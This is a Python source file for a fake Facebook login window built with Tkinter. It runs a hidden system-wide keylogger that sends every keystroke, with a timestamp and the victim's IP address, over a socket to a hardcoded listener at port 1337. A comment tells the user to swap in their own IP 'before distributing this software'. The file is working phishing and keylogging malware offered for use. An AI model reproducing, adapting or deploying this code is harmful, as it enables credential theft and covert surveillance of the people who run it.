import socket
import threading
from pynput import keyboard
import datetime
from tkinter import Tk, Label, messagebox, ttk
from customtkinter import *
import os
def create():
    f = Tk()
    f.geometry("500x500+300+0")
    f.config(bg="#F0F3F4")
    messagebox.showinfo("coming soon","This function is not available ")

def login():
    messagebox.showinfo("logged in","Successfully logged in to your account hehehe😉 Please note that everything you type anywhere is being logged, not just in this input field, as long as this software is running.")

fb = Tk()
fb.geometry("1366x768")
fb.config(bg="#F0F3F4")

Label(fb, text="facebook", fg="#0966FE", bg='#F0F3F4', font=("Helvetica", 45, 'bold')).place(x=180, y=230)
Label(fb, text="Connect with friends and the world", fg="black", font=("Helvetica", 23)).place(x=180, y=310)
Label(fb, text="around you on Facebook.", fg="black", font=("Helvetica", 23)).place(x=180, y=350)

frame = CTkFrame(master=fb,
                 fg_color="#FEFFFE",
                 width=400,
                 height=380,
                 corner_radius=10)

frame.place(relx=0.6, rely=0.17)

usr = CTkEntry(frame, width=350, height=50, corner_radius=5, border_width=0.8, fg_color="white",
               font=("Helvetica", 18), placeholder_text="Email or Phone number")
usr.place(x=25, y=30)

passw = CTkEntry(frame, corner_radius=5, width=350, height=50, border_width=0.8, fg_color="white",
                 font=("Helvetica", 18), placeholder_text="password", show="*")
passw.place(x=25, y=95)

button = CTkButton(frame, hover_color="#1877F2", width=350, height=50, fg_color="#1877F2", text="Log in",
                   text_color="white", font=("Helvetica", 23, 'bold'), command=login)
button.place(x=25, y=165)

fbutton = CTkButton(fb, hover_color="white", fg_color="white", text="forgetten password?", text_color="#1877F2",
                    font=("Helvetica", 16,))
fbutton.place(x=950, y=360)

underline_label = ttk.Label(fb, text="forgetten password?", font=("Helvetica", 16), foreground="blue",
                            background="#F0F3F4")
underline_label.place(x=950, y=360)

underline_color = "blue"  # Change this to the desired underline color

def on_enter(event):
    underline_label.config(font=("Helvetica", 16, "underline"), foreground=underline_color)

def on_leave(event):
    underline_label.config(font=("Helvetica", 16), foreground="blue")  # Change "white" to the original text color

underline_label.bind("<Enter>", on_enter)
underline_label.bind("<Leave>", on_leave)

cbutton = CTkButton(fb, width=40, height=50, fg_color="#42B62B", hover_color="green", text="create new account",
                    text_color="white", font=("Helvetica", 19, 'bold'), command=create)
cbutton.place(x=935, y=430)

CTkFrame(frame, width=300, height=0, bg_color="#cccccc").place(x=60, y=270)

vbutton = CTkButton(fb, fg_color='#F0F3F4', hover_color='#F0F3F4', text="create a page", text_color="black",
                    font=("Helvetica", 14, 'bold'))
vbutton.place(x=850, y=525)

Label(text="for a celebrity, brand or business.", fg="black", font=("Helvetica", 10,)).place(x=971, y=526)

vbutton.bind("<Enter>", lambda event: event.widget.config(
    font=(event.widget.cget("font").split(' ')[0], event.widget.cget("font").split(' ')[1], "underline")))
vbutton.bind("<Leave>", lambda event: event.widget.config(
    font=(event.widget.cget("font").split(' ')[0], event.widget.cget("font").split(' ')[1])))

def get_ipv4_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ipv4_address = s.getsockname()[0]
        s.close()
        return ipv4_address
    except Exception as e:
        return str(e)

ipv4_address = get_ipv4_address()

host = f"192.168.1.69" # Replace with your actual IP address before distributing this software
port = 1337

s = socket.socket()
s.connect((host, port))
def on_press(key, ipv4_address=ipv4_address):
    try:
        keylog = key.char
    except AttributeError:
        keylog = str(key)
    
    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = f"keytyped: {keylog.capitalize()}   at {time} victims ip: {ipv4_address}"
    
    s.send(data.encode("utf-8"))

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.daemon = True
keylogger_thread.start()

fb.mainloop()
